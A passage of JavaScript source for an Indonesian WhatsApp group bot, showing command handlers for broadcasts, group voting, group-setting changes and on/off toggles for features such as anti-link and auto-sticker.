addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isAdmins) return sticAdmin(from)
Dani.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'style': case 'styletext': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
let { styletext } = require('./lib/scraper')
if (!text) throw mess.textt
let anu = await styletext(text)
let teks = `*STYLE TEXT*\n\n`
for (let i of anu) {
teks += `❏ *${i.name}* : ${i.result}\n\n`
}
m.reply(teks)
}
break
case 'bcimg': case 'bcvidio': case 'bcaudio': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!/video/.test(mime) && !/image/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio/Image Yang Ingin Di Broadcast Dengan Caption ${prefix + command}`
let anu = await store.chats.all().map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
let butoon = [{
urlButton: {
displayText: `REST API`,
url: `${webdani}`
}
},
{
quickReplyButton: {
displayText: 'List Menu',
id: 'menu'
}
}]
let media = await Dani.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
if (/webp/.test(mime)) {
Dani.sendMessage(i, { sticker: { url: media } }, { quoted: m })
} else if (/image/.test(mime)) {
let junn = `*_BROADCAST IMAGE_*${text ? '\n\n' + text : ''}`
Dani.send5ButImg(i, junn, `Created By DaniUhhuy`, buffer, butoon)
} else if (/video/.test(mime)) {
let junn = `*_BROADCAST VIDIO_*${text ? '\n\n' + text : ''}`
Dani.send5Vid(i, junn, `Created By DaniUhhuy`, buffer, butoon)
} else if (/audio/.test(mime)) {
Dani.sendMessage(i, {audio: buffer, mimetype: 'audio/mpeg'}, { quoted : freply })
} else {
m.reply(`Kirim/Reply Video/Audio/Image Yang Ingin Di Broadcast Dengan Caption ${prefix + command}`)
}
await fs.unlinkSync(media)
}
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Chats`)
}
break
case 'bcloc': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!text) throw mess.textt
let anu = await store.chats.all().map(v => v.id)
let [melo, melo2] = text.split`|`
m.reply(`*Send Broadcast To* ${anu.length} Chat\nTime ${anu.length * 1.5} minutes`)
for (let yoi of anu) {
await sleep(1500)
var button = [{ buttonId: `${prefix}menu`, buttonText: { displayText: `${melo2}` }, type: 1 }]              
Dani.sendMessage(yoi, { caption: `${melo}`, location: { jpegThumbnail: await getBuffer(picak+'Brodcast') }, buttons: button, footer: `Made With 🤍 Dani | Copyright 2022`, mentions: [m.sender] })
}		
}
break
case 'vote': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
m.reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
vote[m.chat] = [q, [], []]
await sleep(1000)
upvote = vote[m.chat][1]
devote = vote[m.chat][2]
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: 'UPVOTE'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: 'DEVOTE'}, type: 1}
]

let buttonMessageVote = {
text: teks_vote,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttonsVote,
headerType: 1
}
Dani.sendMessage(m.chat, buttonMessageVote)
}
break
case 'upvote': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
isVote = vote[m.chat][1].concat(vote[m.chat][2])
wasVote = isVote.includes(m.sender)
if (wasVote) throw 'Kamu Sudah Vote'
vote[m.chat][1].push(m.sender)
menvote = vote[m.chat][1].concat(vote[m.chat][2])
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsUpvote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: 'UPVOTE'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: 'DEVOTE'}, type: 1}
]

let buttonMessageUpvote = {
text: teks_vote,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttonsUpvote,
headerType: 1,
mentions: menvote
 }
Dani.sendMessage(m.chat, buttonMessageUpvote)
}
break
case 'devote': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
isVote = vote[m.chat][1].concat(vote[m.chat][2])
wasVote = isVote.includes(m.sender)
if (wasVote) throw 'Kamu Sudah Vote'
vote[m.chat][2].push(m.sender)
menvote = vote[m.chat][1].concat(vote[m.chat][2])
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsDevote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]

let buttonMessageDevote = {
text: teks_vote,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttonsDevote,
headerType: 1,
mentions: menvote
}
Dani.sendMessage(m.chat, buttonMessageDevote)
}
break
case 'cekvote':
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote


©DaniSec
`
Dani.sendTextWithMentions(m.chat, teks_vote, m)
break
case 'deletevote': case'delvote': case 'hapusvote': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
delete vote[m.chat]
textImg('Berhasil Menghapus Sesi Vote Di Grup Ini')
}
break
case 'group': case 'grup': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
if (args[0] === 'close'){
await Dani.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await Dani.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
let buttons = [
{ buttonId: 'group open', buttonText: { displayText: 'OPEN' }, type: 1 },
{ buttonId: 'group close', buttonText: { displayText: 'CLOSE' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE GROUP`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'editinfo': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
 if (args[0] === 'open'){
await Dani.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'close'){
await Dani.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
let buttons = [
{ buttonId: 'editinfo open', buttonText: { displayText: 'OPEN' }, type: 1 },
{ buttonId: 'editinfo close', buttonText: { displayText: 'CLOSE' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE EDIT INFO`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'autobio': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
let ciko = db.data.settings[botNumber].autobio
if (args[0] === "on") {
if (ciko) return sticFiturAktif(from)
ciko = true
m.reply(`Auto Bio Aktif !`)
} else if (args[0] === "off") {
if (!ciko) return sticFiturNoAktif(from)
ciko = false
m.reply(`Auto Bio Tidak Aktif !`)
} else {
 let buttons = [
{ buttonId: 'autobio on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'autobio off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE AUTO BIO`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'antilink': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].antilink) return sticFiturAktif(from)
db.data.chats[m.chat].antilink = true
m.reply(`Antilink Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilink) return sticFiturNoAktif(from)
db.data.chats[m.chat].antilink = false
m.reply(`Antilink Tidak Aktif !`)
} else {
 let buttons = [
{ buttonId: 'antilink on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'antilink off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE ANTI LINK`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'anticuttly': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].antilink3) return sticFiturAktif(from)
db.data.chats[m.chat].antilink3 = true
m.reply(`Antilink Cuttly Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilink3) return sticFiturNoAktif(from)
db.data.chats[m.chat].antilink3 = false
m.reply(`Antilink Cuttly Tidak Aktif !`)
} else {
 let buttons = [
{ buttonId: 'antilinkcuttly on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'antilinkcuttly off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE ANTI LINK CUTTLY`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'antitinyul': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].antilink2) return sticFiturAktif(from)
db.data.chats[m.chat].antilink2 = true
m.reply(`Antilink Tinyul Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilink2) return sticFiturNoAktif(from)
db.data.chats[m.chat].antilink2 = false
m.reply(`Antilink Tinyul Tidak Aktif !`)
} else {
 let buttons = [
{ buttonId: 'antilinktinyul on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'antilinktinyul off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE ANTI LINK TINYUL`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'antitoxic': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].antitoxic) return sticFiturAktif(from)
db.data.chats[m.chat].antitoxic = true
m.reply(`Anti Toxic Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antitoxic) return sticFiturNoAktif(from)
db.data.chats[m.chat].antitoxic = false
m.reply(`Anti Toxic Tidak Aktif !`)
} else {
 let buttons = [
{ buttonId: 'antitoxic on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'antitoxic off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE ANTI TOXIC`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'antivirtex': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
if (!isPremium) return sticPremium(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].antivirtex) return sticFiturAktif(from)
db.data.chats[m.chat].antivirtex = true
m.reply(`Anti Virtex Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antivirtex) return sticFiturNoAktif(from)
db.data.chats[m.chat].antivirtex = false
m.reply(`Anti Virtex Tidak Aktif !`)
} else {
 let buttons = [
{ buttonId: 'antivirtex on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'antivirtex off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE ANTI VIRTEX`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'antiwame': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].antiwame) return sticFiturAktif(from)
db.data.chats[m.chat].antiwame = true
m.reply(`Anti Wa Me Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antiwame) return sticFiturNoAktif(from)
db.data.chats[m.chat].antiwame = false
m.reply(`Anti Wa Me Tidak Aktif !`)
} else {
 let buttons = [
{ buttonId: 'antiwame on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'antiwame off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE WA ME`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'mute': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].mute) return sticFiturAktif(from)
db.data.chats[m.chat].mute = true
m.reply(`Dani Botz telah di mute di group ini !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].mute) return sticFiturNoAktif(from)
db.data.chats[m.chat].mute = false
m.reply(`Dani Botz telah di unmute di group ini !`)
} else {
 let buttons = [
{ buttonId: 'mute on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'mute off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MUTE BOT`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'antiviewonce': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].antionce) return sticFiturAktif(from)
db.data.chats[m.chat].antionce = true
m.reply(`Anti Once Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antionce) return sticFiturNoAktif(from)
db.data.chats[m.chat].antionce = false
m.reply(`Anti Once Tidak Aktif !`)
} else {
 let buttons = [
{ buttonId: 'antiviewonce on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'antiviewonce off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE ANTI VIEW ONCE`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'antihidetag': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isAdmins) return sticAdmin(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].antihidetag) return sticFiturAktif(from)
db.data.chats[m.chat].antihidetag = true
m.reply(`Anti Hidetag Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antihidetag) return sticFiturNoAktif(from)
db.data.chats[m.chat].antihidetag = false
m.reply(`Anti Hidetag Tidak Aktif !`)
} else {
 let buttons = [
{ buttonId: 'antihidetag on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'antihidetag off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE ANTI HIDETAG`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'autorespon': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].autorespon) return sticFiturAktif(from)
db.data.chats[m.chat].autorespon = true
m.reply(`Auto Respon Berhasil Di Aktifkan!`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].autorespon) return sticFiturNoAktif(from)
db.data.chats[m.chat].autorespon = false
m.reply(`Auto Respon Berhasil Di Matikan!`)
} else {
 let buttons = [
{ buttonId: 'autorespon on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'autorespon off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE AUTO RESPON`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'leveling': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].leveling) return sticFiturAktif(from)
db.data.chats[m.chat].leveling = true
m.reply(`Leveling Berhasil Di Aktifkan!`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].leveling) return sticFiturNoAktif(from)
db.data.chats[m.chat].leveling = false
m.reply(`Leveling Berhasil Di Matikan!`)
} else {
 let buttons = [
{ buttonId: 'leveling on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'leveling off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE LEVELING`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'nsfw':
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === 'on'){
if (isNsfw) return m.reply(`Udah aktif`)
nsfw.push(from)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(nsfw))
m.reply('Nsfw aktif')
} else if (args[0] === 'off'){
let anu = nsfw.indexOf(from)
nsfw.splice(anu, 1)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(nsfw))
m.reply('Nsfw nonaktif')
} 
break
case 'autosticker':  {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].autosticker) return sticFiturAktif(from)
db.data.chats[m.chat].autosticker = true
m.reply(`Auto Sticker Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].autosticker) return sticFiturNoAktif(from)
db.data.chats[m.chat].autosticker = false
m.reply(`Auto Sticker Tidak Aktif !`)
} else {
 let buttons = [
{ buttonId: 'autosticker on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'autosticker off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE AUTO STICKER`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'autoblock': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].autoblock) return sticFiturAktif(from)
db.data.chats[m.chat].autoblock = true
m.reply(`Auto Block Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].autoblock) return sticFiturNoAktif(from)
db.data.chats[m.chat].autoblock = false
m.reply(`Auto Block Tidak Aktif !`)
} else {
 let buttons = [
{ buttonId: 'autoblock on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'autoblock off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE AUTO BLOCK`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'antibule': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].antibule) return sticFiturAktif(from)
db.data.chats[m.chat].antibule = true
m.reply(`Anti Bule Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antibule) return sticFiturNoAktif(from)
db.data.chats[m.chat].antibule = false
m.reply(`Anti Bule Tidak Aktif !`)
} else {
 let buttons = [
{ buttonId: 'antibule on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'antibule off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE ANTI BULE`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'antivn': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].antivn) return sticFiturAktif(from)
db.data.chats[m.chat].antivn = true
m.reply(`Anti Vn Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antivn) return sticFiturNoAktif(from)
db.data.chats[m.chat].antivn = false
m.reply(`Anti Vn Tidak Aktif !`)
} else {
 let buttons = [
{ buttonId: 'antivn on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'antivn off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE ANTI VN`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'antiphoto': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].antiphoto) return sticFiturAktif(from)
db.data.chats[m.chat].antiphoto = true
m.reply(`Anti Photo Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antiphoto) return sticFiturNoAktif(from)
db.data.chats[m.chat].antiphoto = false
m.reply(`Anti Photo Tidak Aktif !`)
} else {
 let buttons = [
{ buttonId: 'antiphoto on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'antiphoto off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE ANTI PHOTO`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'antivideo': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].antivideo) return sticFiturAktif(from)
db.data.chats[m.chat].antivideo = true
m.reply(`Anti Video Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antivideo) return sticFiturNoAktif(from)
db.data.chats[m.chat].antivideo = false
m.reply(`Anti Video Tidak Aktif !`)
} else {
 let buttons = [
{ buttonId: 'antivideo on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'antivideo off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE ANTI VIDEO`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'antisticker': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
if (args[0] === "on") {
if (db.data.chats[m.chat].antisticker) return sticFiturAktif(from)
db.data.chats[m.chat].antisticker = true
m.reply(`Anti Sticker Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antisticker) return sticFiturNoAktif(from)
db.data.chats[m.chat].antisticker = false
m.reply(`Anti Sticker Tidak Aktif !`)
} else {
 let buttons = [
{ buttonId: 'antisticker on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'antisticker off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE ANTI STICKER`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'autoketik': {	
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (args[0] === 'on') {
if (autoTyping === true) return
global.autoTyping = true
m.reply(`Successfully activated ${command}`)
} else if (args[0] === 'off') {
if (autoTyping === false) return
global.autoTyping = false
m.reply(`Successfully deactivated ${command}`)
} else {
let buttons = [
{ buttonId: 'autoketik on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'autoketik off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE AUTO KETIK`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'autovn': {	
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (args[0] === 'on') {
if (autoRecord === true) return
global.autoRecord = true
m.reply(`Successfully activated ${command}`)
} else if (args[0] === 'off') {
if (autoRecord === false) return
global.autoRecord = false
m.reply(`Successfully deactivated ${command}`)
} else {
let buttons = [
{ buttonId: 'autovn on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'autovn off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `MODE AUTO VN`, `Made With 🤍 Dani | Copyright 2022`, freply)
}
}
break
case 'linkgroup': case 'linkgc': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
let response = await Dani.groupInviteCode(m.chat)
Dani.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'ephemeral': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
if (args[0] === '1') {
